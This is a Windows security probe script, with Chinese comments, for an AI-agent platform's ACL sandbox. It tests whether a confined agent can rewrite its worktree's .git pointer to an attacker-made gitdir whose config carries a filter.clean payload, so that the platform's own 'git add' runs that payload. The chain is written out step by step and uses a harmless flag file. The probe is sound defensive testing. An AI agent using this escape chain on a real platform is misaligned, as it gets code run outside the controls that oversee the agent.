"""probe_git_gitdir_redirect.py —— gitdir 重定向跳板探针（真令牌）。

问题：平台在 **agent 的 worktree** 里跑 git（`git_worktree/service_create.py:1003`
的 checkpoint `add -A`、`merge`、`checkout` 等，cwd = worktree）。git 从哪里找
gitdir？—— `<worktree>/.git` 这个**指针文件**。它落在 agent 可写树里 ⇒ 若 agent
能改写它，平台的 git 就会去读 **agent 目录里的 config**，于是 `filter.<n>.clean`
（动态键名，`GIT_CONFIG_*` 静态清单覆盖不到）照样执行 ⇒ 绕开全部 config 封条。

``workspace_path`` 必须传 worktree、``project_workspace_path`` 传项目根 —— 否则
授权树根退化成项目根，worktree 子树（PROTECTED 的 `.hiveweave` 之下）一个能力
SID 都拿不到，测出来的东西与 executor 形态无关。

用法（仓库根；修前基线请用 HW_SRC 指向 `git archive HEAD` 的纯净树）：
    apps/hiveweave-py/.venv/Scripts/python.exe -u scripts/probe_git_gitdir_redirect.py
"""

from __future__ import annotations

import asyncio
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
SRC = Path(os.environ["HW_SRC"]) if os.environ.get("HW_SRC") else (
    REPO / "apps" / "hiveweave-py" / "src")
sys.path.insert(0, str(SRC))

import win32api  # noqa: E402
import win32con  # noqa: E402
import win32security as ws  # noqa: E402

from hiveweave.config import settings  # noqa: E402
from hiveweave.services.acl_sandbox.service import (  # noqa: E402
    spawn_confined,
)
from hiveweave.util import win_subprocess as wsub  # noqa: E402

COMSPEC = os.environ.get("COMSPEC", r"C:\Windows\System32\cmd.exe")


def note(tag: str, verdict: str, detail: str = "") -> None:
    print(f"PROBE\t{tag}\t{verdict}\t{detail}", flush=True)


def _fwd(p: Path | str) -> str:
    return str(p).replace("\\", "/")


def _dir_has_user_ace(d: Path, user) -> bool:
    try:
        sd = ws.GetNamedSecurityInfo(
            str(d), ws.SE_FILE_OBJECT, ws.DACL_SECURITY_INFORMATION)
    except ws.error:
        return False
    dacl = sd.GetSecurityDescriptorDacl()
    if dacl is None:
        return False
    for i in range(dacl.GetAceCount()):
        ((t, _f), _m, s) = dacl.GetAce(i)
        if t == ws.ACCESS_ALLOWED_ACE_TYPE and s == user:
            return True
    return False


def _grant_user_ace(d: Path, user) -> None:
    sd = ws.GetNamedSecurityInfo(
        str(d), ws.SE_FILE_OBJECT, ws.DACL_SECURITY_INFORMATION)
    dacl = sd.GetSecurityDescriptorDacl()
    if dacl is None:
        return
    dacl.SetEntriesInAcl([{
        "AccessPermissions": 0x1F01FF,
        "AccessMode": ws.GRANT_ACCESS,
        "Inheritance": win32con.CONTAINER_INHERIT_ACE
        | win32con.OBJECT_INHERIT_ACE,
        "Trustee": {
            "MultipleTrustee": None, "MultipleTrusteeOperation": 0,
            "TrusteeForm": ws.TRUSTEE_IS_SID,
            "TrusteeType": ws.TRUSTEE_IS_UNKNOWN, "Identifier": user,
        },
    }])
    ws.SetNamedSecurityInfo(
        str(d), ws.SE_FILE_OBJECT, ws.DACL_SECURITY_INFORMATION,
        sd.GetSecurityDescriptorOwner(), sd.GetSecurityDescriptorGroup(),
        dacl, None)


def _ensure_subject_ace(path: Path) -> None:
    tok = ws.OpenProcessToken(win32api.GetCurrentProcess(), ws.TOKEN_QUERY)
    user, _ = ws.GetTokenInformation(tok, ws.TokenUser)
    tok.Close()
    if not _dir_has_user_ace(path, user):
        _grant_user_ace(path, user)
    anc = path.parent
    while anc != anc.parent and str(anc).lower() != str(anc.anchor).lower():
        if _dir_has_user_ace(anc, user):
            break
        _grant_user_ace(anc, user)
        anc = anc.parent


def _raw_git(cwd: Path, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(["git", *args], cwd=str(cwd), capture_output=True,
                          text=True, encoding="utf-8", errors="replace")


def _funnel_git(cwd: Path, *args: str) -> subprocess.CompletedProcess:
    return wsub.hidden_run(["git", *args], cwd=str(cwd), capture_output=True,
                           text=True, encoding="utf-8", errors="replace",
                           env=dict(os.environ))


async def _run(workdir: Path, agent_id: str, inner: str, *, project: Path):
    return await spawn_confined(
        command=f'"{COMSPEC}" /c {inner}', workdir=str(workdir),
        workspace_path=str(workdir), project_workspace_path=str(project),
        agent_id=agent_id, timeout_s=90, entry="bash")


async def main() -> int:
    if not sys.platform.startswith("win"):
        print("win32 only")
        return 2
    settings.acl_sandbox = True
    base = Path(tempfile.mkdtemp(prefix="hw-gitredir-"))
    _ensure_subject_ace(base)
    proj = base / "proj"
    proj.mkdir()
    (proj / ".hiveweave").mkdir()
    wt = proj / ".hiveweave" / "worktrees" / "A001"
    flag = base / "flag_redir.txt"
    payload = base / "payload.cmd"
    payload.write_text(f"@echo off\r\necho hit > \"{flag}\"\r\n",
                       encoding="utf-8", newline="")

    _raw_git(proj, "init", "-q", "-b", "main")
    _raw_git(proj, "config", "user.email", "t@t.t")
    _raw_git(proj, "config", "user.name", "T")
    (proj / "f.txt").write_text("a\n", encoding="utf-8")
    _raw_git(proj, "add", "f.txt")
    _raw_git(proj, "commit", "-qm", "init")
    _raw_git(proj, "worktree", "add", "-q", str(wt), "-b", "wt/A001")

    evil = base / "evil-gitdir"
    evil.mkdir()
    (evil / "config").write_text(
        f"[filter \"rdr\"]\n\tclean = {_fwd(payload)}\n", encoding="utf-8")
    (evil / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")

    try:
        r = await _run(wt, "A001", "echo boot", project=proj)
        print(f"# bootstrap bash(A001) exit={r and r.get('exit_code')} "
              f"(workspace_path=worktree, project=项目根)")

        ptr = wt / ".git"
        before = ptr.read_text(encoding="utf-8")
        r = await _run(wt, "A001", f'echo gitdir: {_fwd(evil)} > .git',
                       project=proj)
        after = ptr.read_text(encoding="utf-8", errors="replace")
        note("R1-agent-rewrites-<wt>/.git-pointer",
             "WROTE" if after != before else "DENIED",
             f"exit={r and r.get('exit_code')} now={after.strip()[:60]!r}")

        p = _raw_git(wt, "config", "--get", "filter.rdr.clean")
        note("R2-platform-git-reads-evil-config",
             "REDIRECTED" if p.returncode == 0 and p.stdout.strip() else
             "NO-EFFECT",
             f"rc={p.returncode} out={p.stdout.strip()[:60]!r} "
             f"err={p.stderr.strip()[:40]!r}")

        flag.unlink(missing_ok=True)
        (wt / ".gitattributes").write_text("* filter=rdr\n", encoding="utf-8",
                                           newline="\n")
        (wt / "r.txt").write_text("r\n", encoding="utf-8")
        _funnel_git(wt, "add", "r.txt")
        note("R3-redirect+funnel-add",
             "EXECUTED" if flag.exists() else "BLOCKED", "via=funnel")

        # 可用性对照：指针未被改写时，平台在 worktree 里的 git 必须正常
        # （修前基线里 R1 已把指针改坏 ⇒ 这里的失败不算在加固头上）
        p = _funnel_git(wt, "status", "--porcelain")
        note("R4-platform-git-in-worktree-still-works",
             "OK" if p.returncode == 0 else "FAILED",
             f"rc={p.returncode} err={p.stderr.strip()[:60]!r}")
    except BaseException:
        import traceback

        traceback.print_exc()      # 不吞失败
        shutil.rmtree(base, ignore_errors=True)
        sys.stdout.flush()
        sys.stderr.flush()
        os._exit(3)
    finally:
        # 硬退：优雅收尾（stop_watcher/shutdown_runner）在本 harness 下会阻塞。
        shutil.rmtree(base, ignore_errors=True)
        sys.stdout.flush()
        os._exit(0)
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
